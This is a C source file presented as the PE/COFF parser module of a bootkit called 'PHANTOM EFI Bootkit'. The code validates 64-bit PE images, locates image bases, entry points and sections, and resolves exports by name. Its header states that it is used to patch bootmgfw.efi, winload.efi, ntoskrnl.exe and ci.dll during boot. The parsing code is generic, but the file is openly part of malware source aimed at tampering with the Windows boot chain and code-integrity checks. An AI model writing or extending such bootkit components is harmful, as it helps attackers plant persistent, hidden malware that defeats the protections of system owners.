/*
 * PHANTOM EFI Bootkit - PE/COFF Parser
 *
 * Minimal PE64 parser for in-memory image manipulation.
 * Used to validate, parse, and patch PE images during boot
 * (bootmgfw.efi, winload.efi, ntoskrnl.exe, ci.dll).
 */

#include "bootkit.h"

BOOLEAN BkPeValidate(VOID *Base)
{
    if (!Base)
        return FALSE;

    DOS_HEADER *Dos = (DOS_HEADER *)Base;
    if (Dos->e_magic != 0x5A4D)  /* MZ */
        return FALSE;

    if (Dos->e_lfanew > 0x1000)
        return FALSE;

    PE_FILE_HEADER *Pe = (PE_FILE_HEADER *)((UINT8 *)Base + Dos->e_lfanew);
    if (Pe->Signature != 0x00004550)  /* PE\0\0 */
        return FALSE;

    if (Pe->Machine != 0x8664)  /* IMAGE_FILE_MACHINE_AMD64 */
        return FALSE;

    return TRUE;
}

VOID *BkPeGetBase(VOID *Image)
{
    if (!Image)
        return NULL;

    /* walk backwards to find MZ header if given a pointer into the image */
    UINT8 *Scan = (UINT8 *)((UINTN)Image & ~0xFFF);

    for (UINTN i = 0; i < 0x100; i++) {
        if (*(UINT16 *)Scan == 0x5A4D) {
            if (BkPeValidate(Scan))
                return Scan;
        }
        Scan -= 0x1000;
    }

    return NULL;
}

static PE_OPTIONAL_HEADER64 *GetOptionalHeader(VOID *Base)
{
    DOS_HEADER *Dos = (DOS_HEADER *)Base;
    PE_FILE_HEADER *Pe = (PE_FILE_HEADER *)((UINT8 *)Base + Dos->e_lfanew);
    return (PE_OPTIONAL_HEADER64 *)((UINT8 *)Pe + sizeof(PE_FILE_HEADER));
}

UINT32 BkPeGetImageSize(VOID *Base)
{
    if (!BkPeValidate(Base))
        return 0;

    PE_OPTIONAL_HEADER64 *Opt = GetOptionalHeader(Base);
    return Opt->SizeOfImage;
}

VOID *BkPeGetEntryPoint(VOID *Base)
{
    if (!BkPeValidate(Base))
        return NULL;

    PE_OPTIONAL_HEADER64 *Opt = GetOptionalHeader(Base);
    return (UINT8 *)Base + Opt->AddressOfEntryPoint;
}

VOID *BkPeRvaToVa(VOID *Base, UINT32 Rva)
{
    return (UINT8 *)Base + Rva;
}

static SECTION_HEADER *GetFirstSection(VOID *Base)
{
    DOS_HEADER *Dos = (DOS_HEADER *)Base;
    PE_FILE_HEADER *Pe = (PE_FILE_HEADER *)((UINT8 *)Base + Dos->e_lfanew);
    return (SECTION_HEADER *)((UINT8 *)Pe + sizeof(PE_FILE_HEADER) + Pe->SizeOfOptionalHeader);
}

static UINT16 GetSectionCount(VOID *Base)
{
    DOS_HEADER *Dos = (DOS_HEADER *)Base;
    PE_FILE_HEADER *Pe = (PE_FILE_HEADER *)((UINT8 *)Base + Dos->e_lfanew);
    return Pe->NumberOfSections;
}

SECTION_HEADER *BkPeGetSection(VOID *Base, CHAR8 *Name)
{
    if (!BkPeValidate(Base) || !Name)
        return NULL;

    SECTION_HEADER *Sec = GetFirstSection(Base);
    UINT16 Count = GetSectionCount(Base);

    for (UINT16 i = 0; i < Count; i++) {
        BOOLEAN Match = TRUE;
        for (UINTN j = 0; j < 8 && Name[j]; j++) {
            if (Sec[i].Name[j] != Name[j]) {
                Match = FALSE;
                break;
            }
        }
        if (Match)
            return &Sec[i];
    }

    return NULL;
}

/*
 * Resolve an export by name from a PE image.
 * Walks the export directory table.
 */
VOID *BkPeGetExport(VOID *Base, CHAR8 *FuncName)
{
    if (!BkPeValidate(Base) || !FuncName)
        return NULL;

    PE_OPTIONAL_HEADER64 *Opt = GetOptionalHeader(Base);

    /* export directory is data directory index 0 */
    if (Opt->NumberOfRvaAndSizes < 1)
        return NULL;

    DATA_DIRECTORY *ExportDir = (DATA_DIRECTORY *)((UINT8 *)Opt +
        sizeof(PE_OPTIONAL_HEADER64));

    if (!ExportDir->VirtualAddress || !ExportDir->Size)
        return NULL;

    typedef struct {
        UINT32 Characteristics;
        UINT32 TimeDateStamp;
        UINT16 MajorVersion;
        UINT16 MinorVersion;
        UINT32 Name;
        UINT32 Base;
        UINT32 NumberOfFunctions;
        UINT32 NumberOfNames;
        UINT32 AddressOfFunctions;
        UINT32 AddressOfNames;
        UINT32 AddressOfNameOrdinals;
    } EXPORT_DIRECTORY;

    EXPORT_DIRECTORY *Exports = (EXPORT_DIRECTORY *)BkPeRvaToVa(Base, ExportDir->VirtualAddress);

    UINT32 *NameTable     = (UINT32 *)BkPeRvaToVa(Base, Exports->AddressOfNames);
    UINT16 *OrdinalTable  = (UINT16 *)BkPeRvaToVa(Base, Exports->AddressOfNameOrdinals);
    UINT32 *FunctionTable = (UINT32 *)BkPeRvaToVa(Base, Exports->AddressOfFunctions);

    for (UINT32 i = 0; i < Exports->NumberOfNames; i++) {
        CHAR8 *Name = (CHAR8 *)BkPeRvaToVa(Base, NameTable[i]);

        /* compare strings */
        BOOLEAN Match = TRUE;
        for (UINTN j = 0; FuncName[j] || Name[j]; j++) {
            if (FuncName[j] != Name[j]) {
                Match = FALSE;
                break;
            }
        }

        if (Match) {
            UINT16 Ordinal = OrdinalTable[i];
            UINT32 FuncRva = FunctionTable[Ordinal];
            return BkPeRvaToVa(Base, FuncRva);
        }
    }

    return NULL;
}
